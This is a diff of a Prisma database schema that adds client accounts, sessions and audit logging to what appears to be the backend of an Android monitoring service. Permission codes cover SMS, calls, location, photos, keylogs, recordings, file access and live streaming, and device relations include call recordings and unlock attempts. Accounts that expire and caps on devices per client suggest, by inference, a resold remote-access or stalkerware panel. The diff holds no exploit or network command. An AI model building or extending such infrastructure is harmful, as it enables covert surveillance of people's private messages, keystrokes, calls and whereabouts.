@@ -8,11 +8,101 @@ datasource db {
   url      = env("DATABASE_URL")
 }
 
+// ============================================
+// AUTHENTICATION & AUTHORIZATION MODELS
+// ============================================
+
+// User model - Admin or Client with permissions
+model User {
+  id              String    @id @default(uuid())
+  username        String    @unique
+  email           String?   @unique
+  passwordHash    String    // bcrypt hashed
+  role            String    @default("client") // "admin" or "client"
+  isActive        Boolean   @default(true)
+  expiresAt       DateTime? // Account expiration date (null = never)
+  
+  // Signature secret for request validation (HMAC-SHA256)
+  signatureSecret String    @default(uuid())
+  
+  // Feature permissions (JSON array of allowed feature codes)
+  // e.g., ["sms", "calls", "location", "photos", "notifications", "keylogs", "apps", "commands", "recordings", "files", "stream", "chat"]
+  // Use "*" for all permissions (admin)
+  permissions     String?   @db.Text
+  
+  // Limits
+  maxDevices      Int       @default(5)
+  
+  // Audit
+  lastLoginAt     DateTime?
+  lastLoginIp     String?
+  createdAt       DateTime  @default(now())
+  updatedAt       DateTime  @updatedAt
+  createdBy       String?   // Admin who created this user
+  
+  // Relations
+  devices         Device[]  // Devices owned by this user
+  sessions        Session[]
+  auditLogs       AuditLog[]
+
+  @@index([role])
+  @@index([isActive])
+}
+
+// Session model - Active login sessions
+model Session {
+  id            String   @id @default(uuid())
+  userId        String
+  user          User     @relation(fields: [userId], references: [id], onDelete: Cascade)
+  tokenHash     String   @unique // SHA256 hash of JWT token
+  refreshToken  String?  @unique
+  deviceInfo    String?  @db.Text // Browser/device fingerprint
+  ipAddress     String?
+  userAgent     String?  @db.Text
+  isValid       Boolean  @default(true)
+  expiresAt     DateTime
+  createdAt     DateTime @default(now())
+  
+  @@index([userId])
+  @@index([tokenHash])
+  @@index([isValid])
+}
+
+// Audit log for security events
+model AuditLog {
+  id          String   @id @default(uuid())
+  userId      String?
+  user        User?    @relation(fields: [userId], references: [id], onDelete: SetNull)
+  action      String   // "login", "logout", "password_change", "user_create", "user_update", "user_delete", "device_assign", "session_revoke", etc.
+  targetType  String?  // "user", "device", "session"
+  targetId    String?
+  details     String?  @db.Text // JSON details
+  ipAddress   String?
+  userAgent   String?  @db.Text
+  success     Boolean  @default(true)
+  createdAt   DateTime @default(now())
+  
+  @@index([userId])
+  @@index([action])
+  @@index([createdAt])
+  @@index([targetType, targetId])
+}
+
+// ============================================
+// DEVICE & DATA MODELS
+// ============================================
+
 // Device model - represents a registered Android device
 model Device {
   id             String   @id @default(uuid())
   deviceId       String   @unique // Internal app UUID
   androidId      String?  @unique // Physical device Android ID
+  
+  // User ownership - links device to user account
+  userId         String?  // Owner user ID (null = unassigned)
+  user           User?    @relation(fields: [userId], references: [id], onDelete: SetNull)
+  linkedAt       DateTime? // When device was linked to user
+  
   fcmToken       String?  // Firebase Cloud Messaging token
   model          String?  // Device model (e.g., "Samsung Galaxy S21")
   manufacturer   String?
@@ -40,6 +130,8 @@ model Device {
   callRecordings CallRecording[]
   chatMessages   ChatMessage[]
   unlockAttempts UnlockAttempt[]
+
+  @@index([userId])
 }
 
 // SMS messages
